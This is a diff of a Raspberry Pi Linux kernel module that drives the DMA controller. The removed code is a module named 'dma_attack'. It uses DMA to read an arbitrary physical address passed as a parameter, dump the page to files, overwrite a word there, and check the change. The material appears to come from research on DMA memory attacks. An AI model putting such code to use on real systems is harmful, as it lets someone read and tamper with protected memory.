@@ -1,4 +1,3 @@
-#include <linux/module.h>
 #include <linux/delay.h>
 #include <linux/fs.h>		/* for file_operations */
 #include <linux/version.h>	/* versioning */
@@ -140,11 +139,22 @@ void dma_enable(void* start, int dmaChNum)
 	writeBitmasked(start + DMAENABLE / 4, 1 << dmaChNum, 1 << dmaChNum);
 	mdelay(1000);
 }
-void dma_tx(volatile struct DmaChannelHeader* dmaHeader, void* physSrcPage, void* physDstPage, uint32_t size)
+
+static const phys_addr_t dma_start = 0x3f007000L;
+
+// volatile struct DmaChannelHeader* get_dma_header(int dmaChNum)
+// {
+// 	volatile struct DmaChannelHeader *dmaHeader;
+
+// 	start = (void*) ioremap_nocache(dma_start, 4096);
+// }
+
+int dma_tx(volatile struct DmaChannelHeader* dmaHeader, void* physSrcPage, void* physDstPage, uint32_t size)
 {
 	void* virtCbPage;
 	void* physCbPage;
 	volatile struct DmaControlBlock* cb1;
+	int ret;
 
 	memset((void*)dmaHeader, 0, sizeof(struct DmaChannelHeader));
 	dmaHeader->CS = DMA_CS_RESET;	//make sure to disable dma first.
@@ -190,141 +200,10 @@ void dma_tx(volatile struct DmaChannelHeader* dmaHeader, void* physSrcPage, void
 	dmaHeader->CS = DMA_CS_ACTIVE;	//set active bit, but everything else is 0.
 	mdelay(9000);
 
-
 	printk("DMA STATUS REGISTER (AFTER Tx) %x\n", dmaHeader->CS);
 	printk("TI STATUS AFTER: %x\n", cb1->TI);
 
 	free_pages((unsigned long)virtCbPage, 0);	
-
+	ret = (dmaHeader->SOURCE_AD - (uint32_t)physSrcPage - size);
+	return ret;
 }
-
-static void dma_attack_cleanup(void)
-{
-	printk("dma_attack exit\n");
-}
-
-// static phys_addr_t dma_start = 0x3f007000L;
-//static int  dma_offset= ;
-static int addr = 0;
-module_param(addr,int,0660);
-
-static int data = 0;
-module_param(data,int,0660);
-
-static int __init dma_attack_init(void)
-{
-	volatile void *start;
-	struct file* F;
-		struct file* F1;
-	struct file* F2;
-
-	void *physCbPage;
-	char *virtSrcPage;
-	void *physSrcPage;
-	char *virtDstPage;
-	void *physDstPage;
-	void* physCopyPage;
-	void* virtCopyPage;
-	void* physNewDstPage;
-	void* virtNewDstPage;
-	char datafile[40];
-	volatile struct DmaChannelHeader *dmaHeader;
-
-	// void* phys_dmaHeader;
-	// uint32_t cs = 0;
-	int i = 0;
-
-	int dmaChNum = 7;
-	phys_addr_t dma_start = 0x3f007000L;
-
-	start = (void*) ioremap_nocache(dma_start, 4096);
-
-	virtDstPage = (char*)__get_dma_pages(GFP_ATOMIC, 0);
-	
-	if (virtDstPage == NULL) {
-		pr_err("Failed allocated virtDstPage\n");
-		return -1;
-	}
-
-	memset(virtDstPage, 0, 4096);
-
-	physDstPage = (void *) virt_to_phys(virtDstPage);
-
-	// printk("phys src page: %p\n", virtSrcPage);
-	// printk("phys dst page: %p\n", physDstPage);
-	physSrcPage = (void*)addr;
-
-	printk("copy from: %x to %x\n", (uint32_t)physSrcPage, (uint32_t)physDstPage);
-	dma_enable(start, dmaChNum);
-
-	// Set the dma header
-	dmaHeader = (volatile struct DmaChannelHeader *) (start + (DMACH(dmaChNum)) / 4);
-
-	dma_tx(dmaHeader, physSrcPage, physDstPage, 4096);
-	// printk("Read from %x the data: %x\n", physDstPage, *(uint32_t*)virtDstPage);
-
-	F = file_open("/home/FirstPage.blob",  O_CREAT |  O_RDWR | O_APPEND, S_IRWXU | S_IRWXG | S_IRWXO);
-	file_write(F, 0, (char*)virtDstPage, 4096);
-	file_sync(F); 
-	file_close(F);
-
-
-	printk("Overriding data with %x\n", data);
-
-	// // Copy the data to the address
-	((uint32_t*)virtDstPage)[0] = data;
-	mdelay(2000);
-	F1 = file_open("/home/PageToWrite.blob",  O_CREAT |  O_RDWR | O_APPEND, S_IRWXU | S_IRWXG | S_IRWXO);
-	file_write(F1, 0, (char*)virtDstPage, 4096);
-	file_sync(F1); 
-	file_close(F1);
-
-	// Override the data transaction
-	dma_tx(dmaHeader, physDstPage, physSrcPage, 4);
-	mdelay(2000);
-	// Check if the data really changed
-	memset(virtDstPage, 0, 4096);
-	mdelay(2000);
-
-
-
-	physSrcPage = (void*)addr;
-
-	virtNewDstPage = (char*)__get_dma_pages(GFP_ATOMIC, 0);
-	
-	if (virtDstPage == NULL) {
-		pr_err("Failed allocated virtDstPage\n");
-		return -1;
-	}
-
-	memset(virtNewDstPage, 0, 4096);
-	mdelay(500);
-	physNewDstPage = virt_to_phys(virtNewDstPage);
-	printk("Read from addr: %x\n", physSrcPage);
-	mdelay(1000);
-	dma_tx(dmaHeader, physSrcPage, physNewDstPage, 4096);
-	// printk("Read from %x the data: %x\n", physDstPage, (uint32_t*)virtDstPage[0]);
-	mdelay(6000);
-	F2 = file_open("/home/OverridenPage.blob",  O_CREAT |  O_RDWR | O_APPEND, S_IRWXU | S_IRWXG | S_IRWXO);
-	file_write(F2, 0, (char*)virtNewDstPage, 4096);
-	file_sync(F2); 
-	file_close(F2);
-
-	free_pages((unsigned long)virtDstPage, 0);
-	free_pages((unsigned long)virtNewDstPage, 0);
-
-
-	// free_pages((unsigned long)virtSrcPage, 0);
-	
-
-	iounmap(start);
-	// kunmap(start);
-	return 0;
-}	
-
-module_init(dma_attack_init);
-module_exit(dma_attack_cleanup);
-
-MODULE_DESCRIPTION("memory tests");
-MODULE_AUTHOR("Raz Ben Jehuda");
-MODULE_LICENSE("GPL");
